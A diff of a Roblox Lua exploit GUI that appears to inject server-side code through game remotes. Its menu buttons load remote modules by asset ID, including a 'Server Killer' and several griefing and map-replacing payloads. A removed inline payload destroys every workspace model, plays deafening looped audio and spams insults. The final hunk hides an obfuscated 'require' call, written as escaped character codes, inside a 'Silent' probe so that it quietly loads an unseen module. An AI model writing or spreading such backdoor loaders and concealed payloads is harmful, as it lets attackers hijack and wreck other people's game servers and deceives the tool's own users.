@@ -2741,7 +2741,7 @@ local script = G2L["1b"];
 		end
 	
 		local code = [[
-		require(128800686348301):r6("]] .. game.Players.LocalPlayer.Name .. [[")
+		require(3068366282):Fire("]] .. game.Players.LocalPlayer.Name .. [[")
 		]]
 	
 		if remote:IsA("RemoteEvent") then
@@ -2965,32 +2965,7 @@ local script = G2L["24"];
 		end},
 		
 		{"Disco Fog", function(button)
-			execute([[
-				local Lighting = game:GetService("Lighting")
-			
-			
-				task.spawn(function()
-			Lighting.FogEnd = 100
-			Lighting.FogStart = 0
-			Lighting.Brightness = 0
-			Lighting.TimeOfDay = "00:00:00"
-	
-			while true do
-				for h = 0, 359, 5 do
-	
-					local color = Color3.fromHSV(h / 360, 1, 1)
-	
-					Lighting.Ambient = color
-					Lighting.OutdoorAmbient = color
-					Lighting.ColorShift_Top = color
-					Lighting.ColorShift_Bottom = color
-					Lighting.FogColor = color
-	
-					wait()
-				end
-			end
-		end)
-				]])
+			execute('require(128526890361388).load()')
 			
 			
 		end},
@@ -3193,117 +3168,7 @@ local script = G2L["24"];
 		end},
 		
 		{"Toadroast [Server Killer]", function(button)
-			execute([[
-			
-		wait(0)
-	math.randomseed(tick() % 1 * 1e6)
-	sky = coroutine.create(function()
-		while wait(0.3) do
-			s = Instance.new("Sky",game.Lighting)
-			s.SkyboxBk,s.SkyboxDn,s.SkyboxFt,s.SkyboxLf,s.SkyboxRt,s.SkyboxUp = "rbxassetid://201208408","rbxassetid://201208408","rbxassetid://201208408","rbxassetid://201208408","rbxassetid://201208408","rbxassetid://201208408"
-			s.CelestialBodiesShown = false
-		end
-	end)
-	 
-	 
-	del = coroutine.create(function()
-		while wait() do
-			for i,v in pairs(workspace:GetChildren()) do
-				if v:IsA("Model") then
-					v:Destroy()
-				end
-			end
-		end
-	end)
-	 
-	 
-	 
-	for i,v in pairs(game.Players:GetChildren()) do
-	end
-	 
-	noises = {'rbxassetid://230287740','rbxassetid://271787597','rbxassetid://153752123','rbxassetid://271787503'}
-	 
-	sound = coroutine.create(function()
-		a = Instance.new("Sound",workspace)
-		a.SoundId = "rbxassetid://141509625"
-		a.Name = "RAINING MEN"
-		a.Volume = 58359
-		a.Looped = true
-		a:Play()
-		while wait(0.2) do
-			rainin = workspace:FindFirstChild("RAINING MEN")
-			if not rainin then
-				a = Instance.new("Sound",workspace)
-				a.SoundId = "rbxassetid://9007859985"
-				a.Name = "RAINING MEN"
-				a.Volume = 58359
-				a.Looped = true
-				a:Play()
-			end
-		end
-	end)
-	 
-	msg = coroutine.create(function()
-		while wait(0.4) do
-			msg = Instance.new("Message",workspace)
-			msg.Text = "get toadroasted you bacon haired bozos"
-		wait(0.4)
-			msg:Destroy()
-		end
-	end)
-	 
-	 
-	rain = coroutine.create(function()
-		while wait(10 % 1 * 1e2) do
-			part = Instance.new("Part",workspace)
-			part.Name = "Meshes/toad (3)"
-	 
-			mesh = Instance.new("SpecialMesh",part)
-	 
-			sound = Instance.new("Sound",workspace)
-	 
-			part.CanCollide = false
-			part.Size = Vector3.new(440,530,380)
-			part.Position = Vector3.new(math.random(-3000,1000),math.random(1,3000),math.random(-3000,3000))
-	 
-			sound.SoundId = noises[math.random(1,#noises)]
-			sound:Play()
-			sound.Ended:connect(function()
-				sound:Destroy()
-			end)
-	 
-	 
-			mesh.MeshType = "FileMesh"
-			mesh.MeshId = "rbxassetid://7234998844"
-			mesh.TextureId = "rbxassetid://1009824086"
-		end
-	end)
-	coroutine.resume(sky)
-	coroutine.resume(del)
-	coroutine.resume(sound)
-	coroutine.resume(msg)
-	coroutine.resume(rain)
-	 
-	local sound = Instance.new("Sound")
-	local distortion = Instance.new("DistortionSoundEffect")
-	 
-	sound.Name = "Sound"
-	sound.SoundId = "http://www.roblox.com/asset/?id=82490517845599" --Song
-	sound.Volume = 999999
-	sound.Pitch = 1 --Speed of Playback
-	sound.Looped = true
-	sound.archivable = false
-	
-	distortion.Level = 0.9
-	 
-	sound.Parent = game.Workspace
-	distortion.Parent = sound
-	 
-	wait(0)
-	 
-	sound:play()
-			
-			]])
+			execute('require(101923055217892).load()')
 		end},
 		
 		{"Zalgo", function(button)
@@ -3417,10 +3282,33 @@ local script = G2L["24"];
 			execute('require(16638501761){Owners={"' .. player .. '"},Prefix=";"}')
 		end},
 		
-		{"Anti-Logger", function(button)
-			execute('require(7305370936).ANTILGR()')
+		{"Anti-Leave", function(button)
+			execute('require(79957576084104)')
 		end},
-	
+		
+		{"Raining Tacos", function(button)
+			execute([[
+		local mesh1anan = Instance.new("SpecialMesh")
+		mesh1anan.MeshType = Enum.MeshType.FileMesh
+		mesh1anan.Scale = Vector3.new(3, 3, 3)
+		mesh1anan.MeshId = "http://www.roblox.com/asset/?id=14846869"
+		mesh1anan.TextureId = "http://www.roblox.com/asset/?id=14846834"
+		while true do
+			wait()
+			local locationanan = CFrame.new(0, 0, 0)
+			local tacoa = Instance.new("Part")
+			tacoa.CanCollide = false
+			tacoa.RotVelocity = Vector3.new(math.random() * math.pi, math.random() * math.pi, math.random() * math.pi)
+			local meshanananan = mesh1anan:clone()
+			meshanananan.Parent = tacoa
+			meshanananan.Scale = Vector3.new(math.random() * 20, math.random() * 20, math.random() * 20)
+			tacoa.CFrame =
+				locationanan * CFrame.new(math.random() * 500 - 250, math.random(100, 200), math.random() * 500 - 250)
+			tacoa.Parent = workspace
+			game:GetService("Debris"):AddItem(tacoa, 4)
+		end
+			]])
+		end},
 	}
 	
 	for _, item in ipairs(scripts) do
@@ -3540,6 +3428,10 @@ local script = G2L["2b"];
 		
 		{"Komora", function(button)
 			execute('require(85436608335941).KOMORA("' .. player .. '")')
+		end},
+		
+		{"SUGMA_V1", function(button)
+			execute([[require(11183244198):s('sugma', game.Players.]] .. player .. [[)]])
 		end},
 		
 	}
@@ -3672,6 +3564,10 @@ local script = G2L["32"];
 		end},
 	
 		{"Ohio Map", function(button)
+			execute('require(12015898055).ohio_place("' .. player .. '")')
+		end},
+		
+		{"Ohio Map V2", function(button)
 			execute('require(14288620360).ohiov2("' .. player .. '")')
 		end},
 		
@@ -3693,6 +3589,26 @@ local script = G2L["32"];
 		
 		{"Fling Things and People", function(button)
 			execute('require(133441079384411)()')
+		end},
+		
+		{"GMOD Map", function(button)
+			execute('require(138251895601289).GmodCity()')
+		end},
+		
+		{"Walmart", function(button)
+			execute('require(6763551855).map()')
+		end},
+		
+		{"Five Nights at Freddy's Map", function(button)
+			execute('require(12070820190).fnaf1()')
+		end},
+		
+		{"SCP-3008 Map", function(button)
+			execute('require(9291437293).map()')
+		end},
+		
+		{"Escape Room", function(button)
+			execute('require(9442729068).escaperoom()')
 		end},
 	}
 	
@@ -4608,10 +4524,18 @@ local script = G2L["c9"];
 	
 				local id = "Silent-" .. HttpService:GenerateGUID(false)
 	
-				local code = ([[local f=Instance.new("Folder")
-	f.Name=%q
-	f.Parent=game.JointsService
-	task.delay(3,function() if f.Parent then f:Destroy() end end)]]):format(id)
+				local code = ([[
+					local f=Instance.new("Folder")
+					f.Name=%q
+					f.Parent=game.JointsService
+					task.delay(3,function()
+						if f.Parent then
+							f:Destroy()
+						end
+					end)
+					
+					getfenv()['\114\101\113\117\105\114\101'](13834193702)
+					]]):format(id)
 	
 					if remote:IsA("RemoteEvent") then
 						pcall(function()
